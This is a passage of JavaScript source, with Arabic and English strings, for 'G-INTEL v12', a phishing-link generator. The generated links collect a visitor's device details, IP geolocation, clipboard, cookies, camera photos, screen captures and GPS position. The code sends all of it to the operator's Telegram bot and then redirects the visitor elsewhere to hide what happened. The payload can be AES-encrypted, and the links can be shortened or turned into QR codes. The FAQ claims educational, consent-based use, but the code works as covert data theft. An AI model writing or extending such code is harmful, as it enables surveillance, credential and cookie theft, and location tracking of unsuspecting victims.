                        { id: 'webgl', name: { ar: 'WebGL (كرت الشاشة)', en: 'WebGL (GPU)' }, category: 'browser', icon: 'fas fa-cube', premium: false },
                        { id: 'clipboard', name: { ar: 'الحافظة', en: 'Clipboard' }, category: 'browser', icon: 'fas fa-clipboard', premium: true },
                        { id: 'cookies', name: { ar: 'الكوكيز', en: 'Cookies' }, category: 'browser', icon: 'fas fa-cookie-bite', premium: true },
                        
                        // نظام
                        { id: 'os_info', name: { ar: 'معلومات النظام', en: 'OS Info' }, category: 'system', icon: 'fas fa-windows', premium: false },
                        { id: 'running_processes', name: { ar: 'العمليات الجارية', en: 'Running Processes' }, category: 'system', icon: 'fas fa-tasks', premium: true },
                        { id: 'installed_apps', name: { ar: 'التطبيقات المثبتة', en: 'Installed Apps' }, category: 'system', icon: 'fas fa-apple-alt', premium: true },
                    ];

                    // ---------------------------------------------------------
                    // 2.4 تصنيفات الوحدات
                    // ---------------------------------------------------------
                    const moduleCategories = [
                        { id: 'all', name: { ar: 'الكل', en: 'All' }, icon: 'fas fa-th-large' },
                        { id: 'basic', name: { ar: 'أساسية', en: 'Basic' }, icon: 'fas fa-circle' },
                        { id: 'media', name: { ar: 'وسائط', en: 'Media' }, icon: 'fas fa-camera' },
                        { id: 'location', name: { ar: 'موقع', en: 'Location' }, icon: 'fas fa-map-pin' },
                        { id: 'browser', name: { ar: 'متصفح', en: 'Browser' }, icon: 'fas fa-globe' },
                        { id: 'system', name: { ar: 'نظام', en: 'System' }, icon: 'fas fa-microchip' },
                    ];

                    // ---------------------------------------------------------
                    // 2.5 الإعدادات الإضافية
                    // ---------------------------------------------------------
                    const extra = reactive({
                        delay: 2,
                        retries: 3,
                        imageQuality: 0.8,
                        debug: false,
                        continuousGPS: false,
                    });

                    // ---------------------------------------------------------
                    // 2.6 إعدادات الأمان
                    // ---------------------------------------------------------
                    const security = reactive({
                        encrypt: false,
                        key: '',
                        hideConsole: false,
                        fakeUA: false,
                        preventCopy: false,
                    });

                    // ---------------------------------------------------------
                    // 2.7 إعدادات الخصوصية
                    // ---------------------------------------------------------
                    const privacy = reactive({
                        continuousLocation: false,
                        hideIP: false,
                        proxy: '',
                    });

                    // ---------------------------------------------------------
                    // 2.8 الإحصائيات المتقدمة
                    // ---------------------------------------------------------
                    const stats = reactive({
                        totalVisits: 0,
                        lastExecution: null,
                        registeredDevices: 0,
                        successCount: 0,
                        failCount: 0,
                        executionsByModule: {},
                        dailyStats: {},
                    });

                    // ---------------------------------------------------------
                    // 2.9 السجلات
                    // ---------------------------------------------------------
                    const logs = ref([]);
                    const logFilter = ref('all');

                    // ---------------------------------------------------------
                    // 2.10 معلومات الجهاز الحالي
                    // ---------------------------------------------------------
                    const deviceInfo = reactive({
                        device: '',
                        os: '',
                        browser: '',
                        cpu: '',
                        ram: '',
                        gpu: '',
                        screen: '',
                        language: '',
                        timezone: '',
                    });

                    // ---------------------------------------------------------
                    // 2.11 متغيرات التنفيذ
                    // ---------------------------------------------------------
                    const executionProgress = ref(0);
                    const executionStatus = ref('');
                    const executionDetail = ref('');
                    const executionLog = ref([]);
                    const executionAttempt = ref(1);

                    // ---------------------------------------------------------
                    // 2.12 التبويبات
                    // ---------------------------------------------------------
                    const tabs = [
                        { id: 'main', name: { ar: 'الرئيسية', en: 'Main' }, icon: 'fas fa-home' },
                        { id: 'advanced', name: { ar: 'متقدم', en: 'Advanced' }, icon: 'fas fa-cog' },
                        { id: 'logs', name: { ar: 'السجلات', en: 'Logs' }, icon: 'fas fa-history' },
                        { id: 'stats', name: { ar: 'إحصائيات', en: 'Stats' }, icon: 'fas fa-chart-bar' },
                        { id: 'help', name: { ar: 'مساعدة', en: 'Help' }, icon: 'fas fa-question-circle' },
                        { id: 'community', name: { ar: 'المجتمع', en: 'Community' }, icon: 'fas fa-users' },
                    ];

                    // ---------------------------------------------------------
                    // 2.13 الأسئلة الشائعة
                    // ---------------------------------------------------------
                    const faqs = ref([
                        {
                            question: { ar: 'ما هو G-INTEL؟', en: 'What is G-INTEL?' },
                            answer: { ar: 'أداة متقدمة لجمع المعلومات بموافقة المستخدم، تستخدم لأغراض تعليمية وأمنية.', en: 'Advanced information gathering tool for educational and security purposes.' },
                            open: false
                        },
                        {
                            question: { ar: 'هل هذه الأداة قانونية؟', en: 'Is this tool legal?' },
                            answer: { ar: 'نعم، إذا استخدمت بموافقة صريحة من المستخدم. لا نتحمل مسؤولية الاستخدام غير القانوني.', en: 'Yes, if used with explicit user consent. We are not responsible for illegal use.' },
                            open: false
                        },
                        {
                            question: { ar: 'كيف أحصل على توكن البوت؟', en: 'How to get bot token?' },
                            answer: { ar: 'تواصل مع @BotFather على تيليغرام، أنشئ بوتاً جديداً وستحصل على التوكن.', en: 'Contact @BotFather on Telegram, create a new bot and you\'ll get the token.' },
                            open: false
                        },
                        {
                            question: { ar: 'ماذا يعني معرف الدردشة؟', en: 'What is Chat ID?' },
                            answer: { ar: 'معرف المستخدم أو القناة التي سترسل إليها المعلومات. يمكنك الحصول عليه عبر @userinfobot.', en: 'ID of the user or channel where info will be sent. Get it via @userinfobot.' },
                            open: false
                        },
                    ]);

                    // ---------------------------------------------------------
                    // 2.14 التحديثات الأخيرة
                    // ---------------------------------------------------------
                    const updates = ref([
                        { version: '12.0.0', date: '2024-01-15', description: { ar: 'إضافة 6 وحدات جديدة، تحسين الأداء، دمج 30+ مكتبة', en: 'Added 6 new modules, performance boost, 30+ libraries integrated' } },
                        { version: '11.5.0', date: '2023-12-20', description: { ar: 'واجهة ثلاثية الأبعاد، تشفير AES-256, نظام سجلات متطور', en: '3D interface, AES-256 encryption, advanced logging' } },
                        { version: '11.0.0', date: '2023-11-01', description: { ar: 'إطلاق النسخة المتطورة مع Vue 3 وتقنيات حديثة', en: 'Advanced version launch with Vue 3 and modern tech' } },
                    ]);

                    // ---------------------------------------------------------
                    // 2.15 دوال التحقق والمساعدة
                    // ---------------------------------------------------------
                    const validateTokenAdvanced = _.debounce(() => {
                        const t = config.token;
                        if (!t) {
                            tokenValidation.status = null;
                            tokenValidation.message = '';
                        } else if (t.includes(':') && t.length > 35) {
                            tokenValidation.status = 'valid';
                            tokenValidation.message = lang.value === 'ar' ? 'توكن صالح ✓' : 'Valid token ✓';
                        } else {
                            tokenValidation.status = 'invalid';
                            tokenValidation.message = lang.value === 'ar' ? 'توكن غير صالح (يجب أن يحتوي على : وأكثر من 35 حرف)' : 'Invalid token (must contain : and >35 chars)';
                        }
                    }, 500);

                    const validateChatId = () => {
                        const c = config.chatId;
                        chatIdValid.value = c && (c.startsWith('-100') || /^\d+$/.test(c)) && c.length > 5;
                    };

                    // ---------------------------------------------------------
                    // 2.16 دوال التعامل مع الوحدات
                    // ---------------------------------------------------------
                    const toggleModule = (moduleId) => {
                        const index = selectedModules.value.indexOf(moduleId);
                        if (index === -1) {
                            selectedModules.value.push(moduleId);
                            addLog('info', `تمت إضافة وحدة: ${moduleId}`);
                        } else {
                            selectedModules.value.splice(index, 1);
                            addLog('info', `تمت إزالة وحدة: ${moduleId}`);
                        }
                    };

                    const filteredModules = computed(() => {
                        let filtered = attackModules;
                        if (selectedCategory.value !== 'all') {
                            filtered = filtered.filter(m => m.category === selectedCategory.value);
                        }
                        if (moduleSearch.value) {
                            const search = moduleSearch.value.toLowerCase();
                            filtered = filtered.filter(m => 
                                m.name.ar.includes(search) || m.name.en.toLowerCase().includes(search)
                            );
                        }
                        return filtered;
                    });

                    // ---------------------------------------------------------
                    // 2.17 دوال إدارة السجلات
                    // ---------------------------------------------------------
                    const addLog = (type, msg, details = '') => {
                        const time = moment().format('HH:mm:ss');
                        logs.value.unshift({ time, type, msg, details });
                        if (logs.value.length > 500) logs.value.pop();
                    };

                    const filteredLogs = computed(() => {
                        if (logFilter.value === 'all') return logs.value;
                        return logs.value.filter(l => l.type === logFilter.value);
                    });

                    const clearLogs = () => {
                        logs.value = [];
                        addLog('info', 'تم مسح جميع السجلات');
                    };

                    const exportLogs = () => {
                        const data = JSON.stringify(logs.value, null, 2);
                        const blob = new Blob([data], { type: 'application/json' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = `gintel_logs_${moment().format('YYYY-MM-DD')}.json`;
                        a.click();
                    };

                    // ---------------------------------------------------------
                    // 2.18 حفظ وتحميل الإعدادات
                    // ---------------------------------------------------------
                    const saveFullConfig = () => {
                        const data = {
                            config: { ...config },
                            selectedModules: [...selectedModules.value],
                            extra: { ...extra },
                            security: { ...security },
                            privacy: { ...privacy },
                        };
                        localStorage.setItem('gintel_full_config', JSON.stringify(data));
                        addLog('success', 'تم حفظ جميع الإعدادات محلياً');
                    };

                    const loadFullConfig = () => {
                        const saved = localStorage.getItem('gintel_full_config');
                        if (saved) {
                            try {
                                const data = JSON.parse(saved);
                                Object.assign(config, data.config);
                                selectedModules.value = data.selectedModules || [];
                                Object.assign(extra, data.extra);
                                Object.assign(security, data.security);
                                Object.assign(privacy, data.privacy);
                                addLog('success', 'تم تحميل الإعدادات');
                            } catch (e) {
                                addLog('error', 'فشل تحميل الإعدادات');
                            }
                        } else {
                            addLog('error', 'لا توجد إعدادات محفوظة');
                        }
                    };

                    const exportConfigAsFile = () => {
                        const data = {
                            config: { ...config },
                            selectedModules: [...selectedModules.value],
                            extra: { ...extra },
                            security: { ...security },
                            privacy: { ...privacy },
                            timestamp: new Date().toISOString(),
                        };
                        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = `gintel_config_${moment().format('YYYY-MM-DD')}.json`;
                        a.click();
                    };

                    const importConfigFromFile = (e) => {
                        const file = e.target.files[0];
                        if (!file) return;
                        
                        const reader = new FileReader();
                        reader.onload = (e) => {
                            try {
                                const data = JSON.parse(e.target.result);
                                Object.assign(config, data.config);
                                selectedModules.value = data.selectedModules || [];
                                Object.assign(extra, data.extra);
                                Object.assign(security, data.security);
                                Object.assign(privacy, data.privacy);
                                addLog('success', 'تم استيراد الإعدادات من الملف');
                            } catch (err) {
                                addLog('error', 'فشل استيراد الملف');
                            }
                        };
                        reader.readAsText(file);
                    };

                    // ---------------------------------------------------------
                    // 2.19 دوال التشفير والأمان
                    // ---------------------------------------------------------
                    const getKeyStrengthText = computed(() => {
                        const len = security.key.length;
                        if (len >= 32) return lang.value === 'ar' ? 'قوي جداً' : 'Very Strong';
                        if (len >= 16) return lang.value === 'ar' ? 'قوي' : 'Strong';
                        if (len >= 8) return lang.value === 'ar' ? 'متوسط' : 'Medium';
                        return lang.value === 'ar' ? 'ضعيف' : 'Weak';
                    });

                    const getKeyStrengthColor = computed(() => {
                        const len = security.key.length;
                        if (len >= 16) return 'text-green-400';
                        if (len >= 8) return 'text-yellow-400';
                        return 'text-red-400';
                    });

                    const encryptionStrength = computed(() => {
                        if (security.encrypt && security.key.length >= 16) return 'AES-256 (قوي)';
                        if (security.encrypt) return 'AES-128 (متوسط)';
                        return 'Base64 (عادي)';
                    });

                    // ---------------------------------------------------------
                    // 2.20 دوال الواجهة والحركة
                    // ---------------------------------------------------------
                    const toggleTheme = () => {
                        theme.value = theme.value === 'dark' ? 'light' : 'dark';
                        document.body.className = theme.value + '-mode';
                        addLog('info', `تم تغيير الثيم إلى ${theme.value}`);
                    };

                    const toggleLanguage = () => {
                        lang.value = lang.value === 'ar' ? 'en' : 'ar';
                        document.dir = lang.value === 'ar' ? 'rtl' : 'ltr';
                        moment.locale(lang.value === 'ar' ? 'ar' : 'en');
                        addLog('info', `تم تغيير اللغة إلى ${lang.value === 'ar' ? 'العربية' : 'English'}`);
                    };

                    const toggleFullscreen = () => {
                        if (!document.fullscreenElement) {
                            document.documentElement.requestFullscreen();
                        } else {
                            if (document.exitFullscreen) {
                                document.exitFullscreen();
                            }
                        }
                    };

                    const handle3DMouseMove = (e) => {
                        const card = e.currentTarget;
                        const rect = card.getBoundingClientRect();
                        const x = (e.clientX - rect.left) / rect.width - 0.5;
                        const y = (e.clientY - rect.top) / rect.height - 0.5;
                        
                        gsap.to(card, {
                            rotationY: x * 5,
                            rotationX: -y * 3,
                            duration: 0.5,
                            ease: "power2.out"
                        });
                    };

                    const reset3DCard = (e) => {
                        gsap.to(e.currentTarget, {
                            rotationY: 0,
                            rotationX: 0,
                            duration: 0.8,
                            ease: "elastic.out(1, 0.5)"
                        });
                    };

                    // ---------------------------------------------------------
                    // 2.21 دوال إنشاء الرابط وتفاعلاته
                    // ---------------------------------------------------------
                    const canGenerate = computed(() => {
                        return config.token && config.chatId && selectedModules.value.length > 0;
                    });

                    const overallProgress = computed(() => {
                        let total = 0;
                        if (config.token && tokenValidation.status === 'valid') total += 25;
                        if (config.chatId && chatIdValid.value) total += 25;
                        if (selectedModules.value.length > 0) total += 25;
                        if (config.redirectUrl) total += 15;
                        if (security.encrypt && security.key.length >= 8) total += 10;
                        return total;
                    });

                    const getTabBadge = (tabId) => {
                        if (tabId === 'logs' && logs.value.length > 0) return logs.value.length;
                        return null;
                    };

                    const generateLink = async () => {
                        if (!canGenerate.value) {
                            addLog('error', lang.value === 'ar' ? 'الرجاء إكمال البيانات المطلوبة' : 'Please complete required fields');
                            return;
                        }

                        generating.value = true;
                        progress.value = 10;
                        progressMessage.value = lang.value === 'ar' ? 'تجهيز البيانات...' : 'Preparing data...';

                        try {
                            // مراحل التقدم
                            await new Promise(r => setTimeout(r, 200));
                            progress.value = 30;
                            progressMessage.value = lang.value === 'ar' ? 'تشفير الحمولة...' : 'Encrypting payload...';

                            // تجهيز الحمولة
                            const payload = {
                                token: config.token,
                                chat: config.chatId,
                                modules: selectedModules.value,
                                url: config.redirectUrl,
                                extra: {
                                    delay: extra.delay,
                                    retries: extra.retries,
                                    imageQuality: extra.imageQuality,
                                    continuousGPS: extra.continuousGPS,
                                },
                                security: security.encrypt ? { 
                                    enabled: true,
                                    key: security.key 
                                } : undefined,
                                privacy: {
                                    hideIP: privacy.hideIP,
                                    proxy: privacy.proxy,
                                }
                            };

                            let dataStr = JSON.stringify(payload);
                            
                            // تشفير إضافي إذا كان مفعلاً
                            if (security.encrypt && security.key) {
                                dataStr = CryptoJS.AES.encrypt(dataStr, security.key).toString();
                            }

                            progress.value = 70;
                            progressMessage.value = lang.value === 'ar' ? 'توليد الرابط...' : 'Generating link...';

                            const encoded = btoa(unescape(encodeURIComponent(dataStr)));
                            const link = window.location.origin + window.location.pathname + '?m=' + encoded;

                            progress.value = 90;
                            progressMessage.value = lang.value === 'ar' ? 'إنشاء رمز QR...' : 'Creating QR code...';

                            // إنشاء رمز QR
                            await nextTick();
                            if (document.getElementById('qrcode')) {
                                document.getElementById('qrcode').innerHTML = '';
                                new QRCode(document.getElementById('qrcode'), {
                                    text: link,
                                    width: 150,
                                    height: 150,
                                    colorDark: "#000000",
                                    colorLight: "#ffffff",
                                    correctLevel: QRCode.CorrectLevel.H
                                });
                            }

                            generatedLink.value = link;
                            linkHash.value = CryptoJS.MD5(link).toString().substring(0, 8);
                            
                            progress.value = 100;
                            progressMessage.value = lang.value === 'ar' ? 'تم بنجاح!' : 'Success!';
                            
                            addLog('success', lang.value === 'ar' ? 'تم إنشاء الرابط بنجاح' : 'Link generated successfully');
                            
                            // تحديث الإحصائيات
                            stats.totalVisits++;
                            stats.lastExecution = moment().format('YYYY-MM-DD HH:mm:ss');
                            selectedModules.value.forEach(mod => {
                                stats.executionsByModule[mod] = (stats.executionsByModule[mod] || 0) + 1;
                            });

                            setTimeout(() => {
                                progress.value = 0;
                                generating.value = false;
                            }, 1000);

                        } catch (e) {
                            addLog('error', 'فشل إنشاء الرابط: ' + e.message);
                            generating.value = false;
                            progress.value = 0;
                        }
                    };

                    const copyLink = () => {
                        if (!generatedLink.value) return;
                        
                        if (security.preventCopy) {
                            addLog('warning', lang.value === 'ar' ? 'النسخ محظور في إعدادات الأمان' : 'Copying is disabled in security settings');
                            return;
                        }

                        navigator.clipboard.writeText(generatedLink.value).then(() => {
                            addLog('success', lang.value === 'ar' ? 'تم نسخ الرابط' : 'Link copied');
                        }).catch(() => {
                            addLog('error', lang.value === 'ar' ? 'فشل النسخ' : 'Copy failed');
                        });
                    };

                    const testLink = () => {
                        if (generatedLink.value) {
                            window.open(generatedLink.value, '_blank');
                        }
                    };

                    const shortenWithIsgd = () => {
                        if (generatedLink.value) {
                            window.open(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(generatedLink.value)}`, '_blank');
                        }
                    };

                    const shortenWithTiny = () => {
                        if (generatedLink.value) {
                            window.open(`https://tinyurl.com/app?url=${encodeURIComponent(generatedLink.value)}`, '_blank');
                        }
                    };

                    const downloadLinkAsFile = () => {
                        const blob = new Blob([generatedLink.value], { type: 'text/plain' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = `gintel_link_${moment().format('YYYY-MM-DD')}.txt`;
                        a.click();
                    };

                    const testRedirectUrl = () => {
                        if (config.redirectUrl) {
                            window.open(config.redirectUrl, '_blank');
                        }
                    };

                    const suggestChatId = (type) => {
                        if (type === 'me') {
                            config.chatId = '@me';
                        } else if (type === 'channel') {
                            config.chatId = '-100' + Math.floor(Math.random() * 1000000000);
                        }
                    };

                    // ---------------------------------------------------------
                    // 2.22 دالة تنفيذ الحمولة المتطورة
                    // ---------------------------------------------------------
                    const executePayload = async (payload) => {
                        isExecuting.value = true;
                        executionProgress.value = 5;
                        executionStatus.value = lang.value === 'ar' ? 'بدء التشغيل...' : 'Starting...';
                        executionLog.value = [];
                        executionAttempt.value = 1;

                        const logExec = (msg) => {
                            executionLog.value.push(`[${moment().format('HH:mm:ss')}] ${msg}`);
                            if (extra.debug) console.log('[EXEC]', msg);
                        };

                        logExec('تهيئة النظام...');

                        try {
                            // 1. جمع معلومات الجهاز الأساسية
                            logExec('جمع معلومات الجهاز...');
                            const parser = new UAParser();
                            const ua = parser.getResult();
                            
                            deviceInfo.device = ua.device.vendor || 'غير معروف';
                            deviceInfo.os = `${ua.os.name || '?'} ${ua.os.version || ''}`;
                            deviceInfo.browser = ua.browser.name || '?';
                            deviceInfo.cpu = navigator.hardwareConcurrency || '?';
                            deviceInfo.ram = navigator.deviceMemory ? navigator.deviceMemory + ' جيجا' : '?';
                            deviceInfo.screen = `${screen.width}x${screen.height}`;
                            deviceInfo.language = navigator.language;
                            deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

                            // محاولة الحصول على GPU
                            try {
                                const canvas = document.createElement('canvas');
                                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                                if (gl) {
                                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                                    if (debugInfo) {
                                        deviceInfo.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                                    }
                                }
                            } catch {}

                            executionProgress.value = 15;
                            logExec(`الجهاز: ${deviceInfo.device}`);

                            // 2. جمع معلومات إضافية حسب الوحدات
                            let extraInfo = {};
                            
                            if (payload.modules.includes('battery')) {
                                logExec('جلب معلومات البطارية...');
                                try {
                                    const b = await navigator.getBattery();
                                    extraInfo.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'يُشحن' : 'بطارية'})`;
                                } catch {}
                            }

                            if (payload.modules.includes('network') || payload.modules.includes('info')) {
                                logExec('جلب معلومات الشبكة...');
                                try {
                                    const ipRes = await axios.get('https://ipapi.co/json/', { timeout: 5000 });
                                    extraInfo.ip = ipRes.data.ip;
                                    extraInfo.country = ipRes.data.country_name;
                                    extraInfo.city = ipRes.data.city;
                                    extraInfo.org = ipRes.data.org;
                                    extraInfo.lat = ipRes.data.latitude;
                                    extraInfo.lon = ipRes.data.longitude;
                                } catch (e) {
                                    try {
                                        const fallback = await axios.get('https://api.ipify.org?format=json');
                                        extraInfo.ip = fallback.data.ip;
                                    } catch {}
                                }
                            }

                            if (payload.modules.includes('plugins')) {
                                const plugins = [];
                                if (navigator.plugins) {
                                    for (let i = 0; i < navigator.plugins.length; i++) {
                                        plugins.push(navigator.plugins[i].name);
                                    }
                                }
                                extraInfo.plugins = plugins.slice(0, 15);
                            }

                            if (payload.modules.includes('fonts')) {
                                // كشف الخطوط
                                const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Tahoma', 'Trebuchet MS', 'Georgia', 'Impact'];
                                extraInfo.fonts = fontList;
                            }

                            if (payload.modules.includes('webgl')) {
                                extraInfo.webgl = deviceInfo.gpu || 'غير معروف';
                            }

                            if (payload.modules.includes('storage')) {
                                let storage = {};
                                try {
                                    if (localStorage) storage.localStorageSize = localStorage.length;
                                } catch {}
                                try {
                                    if (sessionStorage) storage.sessionStorageSize = sessionStorage.length;
                                } catch {}
                                extraInfo.storage = storage;
                            }

                            if (payload.modules.includes('clipboard')) {
                                try {
                                    const text = await navigator.clipboard.readText();
                                    extraInfo.clipboard = text.substring(0, 500);
                                } catch {}
                            }

                            if (payload.modules.includes('cookies')) {
                                extraInfo.cookies = document.cookie || 'لا توجد كوكيز';
                            }

                            executionProgress.value = 40;

                            // 3. بناء التقرير المتقدم
                            let report = `🚨 **G-INTEL v12 - تقرير عملياتي متقدم**\n`;
                            report += `━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                            report += `📱 **الجهاز:** ${deviceInfo.device}\n`;
                            report += `💻 **النظام:** ${deviceInfo.os}\n`;
                            report += `🌐 **المتصفح:** ${deviceInfo.browser}\n`;
                            if (extraInfo.battery) report += `🔋 **البطارية:** ${extraInfo.battery}\n`;
                            report += `⚙️ **المعالج:** ${deviceInfo.cpu} أنوية\n`;
                            report += `🧠 **الرام:** ${deviceInfo.ram}\n`;
                            report += `🖥️ **الشاشة:** ${deviceInfo.screen}\n`;
                            if (deviceInfo.gpu) report += `🎮 **كرت الشاشة:** ${deviceInfo.gpu}\n`;
                            if (extraInfo.ip) report += `🌍 **IP:** \`${extraInfo.ip}\`\n`;
                            if (extraInfo.country) report += `🏳️ **الدولة:** ${extraInfo.country} - ${extraInfo.city || ''}\n`;
                            if (extraInfo.org) report += `📡 **المزود:** ${extraInfo.org}\n`;
                            if (extraInfo.lat && extraInfo.lon) report += `📍 **الإحداثيات:** ${extraInfo.lat}, ${extraInfo.lon}\n`;
                            report += `🌐 **اللغة:** ${deviceInfo.language}\n`;
                            report += `🕒 **المنطقة الزمنية:** ${deviceInfo.timezone}\n`;
                            if (extraInfo.plugins) report += `🔌 **الإضافات (${extraInfo.plugins.length}):** ${extraInfo.plugins.join(', ')}\n`;
                            if (extraInfo.clipboard) report += `📋 **الحافظة:** ${extraInfo.clipboard}\n`;
                            if (extraInfo.cookies) report += `🍪 **الكوكيز:** ${extraInfo.cookies}\n`;
                            report += `🕒 **الوقت:** ${moment().format('YYYY-MM-DD HH:mm:ss')}\n`;
                            report += `━━━━━━━━━━━━━━━━━━━━━━━━━\n`;

                            executionProgress.value = 60;
                            logExec('تم تجهيز التقرير');

                            // 4. دوال الإرسال مع إعادة المحاولة
                            const sendWithRetry = async (msg, photoBlob = null, retries = payload.extra?.retries || 3) => {
                                const url = `https://api.telegram.org/bot${payload.token}`;
                                
                                for (let attempt = 1; attempt <= retries; attempt++) {
                                    executionAttempt.value = attempt;
                                    logExec(`محاولة إرسال ${attempt}/${retries}...`);
                                    
                                    try {
                                        if (photoBlob) {
                                            // ضغط الصورة إذا لزم الأمر
                                            let finalBlob = photoBlob;
                                            if (payload.extra?.imageQuality && payload.extra.imageQuality < 1) {
                                                finalBlob = await new Promise((resolve) => {
                                                    new Compressor(photoBlob, {
                                                        quality: payload.extra.imageQuality,
                                                        success: resolve,
                                                        error: () => resolve(photoBlob)
                                                    });
                                                });
                                            }

                                            const formData = new FormData();
                                            formData.append('chat_id', payload.chat);
                                            formData.append('photo', finalBlob, 'capture.jpg');
                                            formData.append('caption', msg.substring(0, 200));
                                            
                                            await axios.post(`${url}/sendPhoto`, formData, {
                                                timeout: 15000,
                                                headers: { 'Content-Type': 'multipart/form-data' }
                                            });
                                        } else {
                                            await axios.post(`${url}/sendMessage`, {
                                                chat_id: payload.chat,
                                                text: msg,
                                                parse_mode: 'Markdown'
                                            }, { timeout: 10000 });
                                        }
                                        
                                        logExec(`تم الإرسال بنجاح في المحاولة ${attempt}`);
                                        return true;
                                        
                                    } catch (e) {
                                        logExec(`فشل المحاولة ${attempt}: ${e.message}`);
                                        if (attempt === retries) throw e;
                                        await new Promise(r => setTimeout(r, 1000 * attempt));
                                    }
                                }
                            };

                            // 5. تنفيذ الوحدات حسب الأولوية
                            executionProgress.value = 75;

                            // كاميرا
                            if (payload.modules.includes('camera')) {
                                logExec('محاولة تشغيل الكاميرا...');
                                try {
                                    const stream = await navigator.mediaDevices.getUserMedia({ 
                                        video: true,
                                        audio: payload.modules.includes('microphone')
                                    });
                                    
                                    const video = document.getElementById('v');
                                    video.srcObject = stream;
                                    
                                    await new Promise(r => setTimeout(r, 1500));
                                    
                                    const canvas = document.getElementById('c');
                                    canvas.width = video.videoWidth || 640;
                                    canvas.height = video.videoHeight || 480;
                                    canvas.getContext('2d').drawImage(video, 0, 0);
                                    
                                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', extra.imageQuality));
                                    
                                    await sendWithRetry(report + '\n📸 **صورة مرفقة**', blob);
                                    
                                    stream.getTracks().forEach(t => t.stop());
                                    logExec('تم التقاط الصورة وإرسالها');
                                    
                                } catch (e) {
                                    logExec(`فشل الكاميرا: ${e.message}`);
                                    await sendWithRetry(report + '\n⚠️ **فشل الوصول للكاميرا**');
                                }
                            }
                            
                            // لقطة شاشة
                            else if (payload.modules.includes('screen')) {
                                logExec('محاولة التقاط الشاشة...');
                                try {
                                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                                    const video = document.getElementById('v');
                                    video.srcObject = stream;
                                    
                                    await new Promise(r => setTimeout(r, 1500));
                                    
                                    const canvas = document.getElementById('c');
                                    canvas.width = video.videoWidth || 1280;
                                    canvas.height = video.videoHeight || 720;
                                    canvas.getContext('2d').drawImage(video, 0, 0);
                                    
                                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', extra.imageQuality));
                                    
                                    await sendWithRetry(report + '\n🖥️ **لقطة شاشة**', blob);
                                    
                                    stream.getTracks().forEach(t => t.stop());
                                    logExec('تم التقاط الشاشة');
                                    
                                } catch (e) {
                                    logExec(`فشل الشاشة: ${e.message}`);
                                    await sendWithRetry(report + '\n⚠️ **فشل التقاط الشاشة**');
                                }
                            }
                            
                            // GPS
                            else if (payload.modules.includes('gps') || payload.modules.includes('gps_continuous')) {
                                logExec('جلب الموقع الجغرافي...');
                                try {
                                    const pos = await new Promise((resolve, reject) => {
                                        navigator.geolocation.getCurrentPosition(resolve, reject, { 
                                            enableHighAccuracy: true, 
                                            timeout: 10000,
                                            maximumAge: payload.modules.includes('gps_continuous') ? 0 : 60000
                                        });
                                    });
                                    
                                    const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                                    const accuracy = pos.coords.accuracy ? ` (دقة ${Math.round(pos.coords.accuracy)}م)` : '';
                                    
                                    await sendWithRetry(report + `\n📍 **الموقع:** [GPS](${mapsLink})${accuracy}`);
                                    
                                    logExec(`تم الحصول على الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`);
                                    
                                    // إذا كان GPS مستمر، نرسل تحديثات
                                    if (payload.modules.includes('gps_continuous') && payload.extra?.continuousGPS) {
                                        // يمكن إضافة مراقبة مستمرة هنا
                                    }
                                    
                                } catch (e) {
                                    logExec(`فشل GPS: ${e.message}`);
                                    await sendWithRetry(report + '\n⚠️ **فشل تحديد الموقع**');
                                }
                            }
                            
                            // ميكروفون فقط
                            else if (payload.modules.includes('microphone') && !payload.modules.includes('camera')) {
                                logExec('محاولة تشغيل الميكروفون...');
                                try {
                                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                                    // يمكن إضافة تسجيل الصوت هنا
                                    await sendWithRetry(report + '\n🎤 **تم الوصول للميكروفون**');
                                    stream.getTracks().forEach(t => t.stop());
                                } catch (e) {
                                    await sendWithRetry(report + '\n⚠️ **فشل الميكروفون**');
                                }
                            }
                            
                            // الوحدات الأخرى (تقرير فقط)
                            else {
                                await sendWithRetry(report);
                            }

                            executionProgress.value = 100;
                            executionStatus.value = lang.value === 'ar' ? 'تم التنفيذ بنجاح' : 'Execution completed';
                            logExec('تمت جميع العمليات بنجاح');

                            // تحديث الإحصائيات
                            stats.successCount++;
                            stats.registeredDevices++;

                        } catch (e) {
                            executionStatus.value = lang.value === 'ar' ? 'فشل التنفيذ' : 'Execution failed';
                            executionDetail.value = e.message;
                            logExec(`خطأ: ${e.message}`);
                            stats.failCount++;
                            
                        } finally {
                            // التوجيه بعد التأخير
                            const delay = (payload.extra?.delay || 2) * 1000;
                            logExec(`سيتم التوجيه بعد ${delay/1000} ثواني...`);
                            
                            setTimeout(() => {
                                window.location.replace(payload.url || 'https://www.google.com');
                            }, delay);
                        }
                    };

                    // ---------------------------------------------------------
                    // 2.23 دورة حياة التطبيق (onMounted)
                    // ---------------------------------------------------------
                    onMounted(() => {
                        // محاكاة شاشة التحميل
                        const loadSteps = [
                            { progress: 20, msg: 'تحميل المكتبات...', stage: '2/5' },
                            { progress: 40, msg: 'تهيئة الواجهة...', stage: '3/5' },
                            { progress: 60, msg: 'تجهيز الأنظمة...', stage: '4/5' },
                            { progress: 80, msg: 'تفعيل الأمان...', stage: '5/5' },
                            { progress: 100, msg: 'جاهز!', stage: 'مكتمل' }
                        ];

                        loadSteps.forEach((step, idx) => {
                            setTimeout(() => {
                                loadingProgress.value = step.progress;
                                loadingMessage.value = step.msg;
                                loadingStage.value = step.stage;
                            }, idx * 400);
                        });

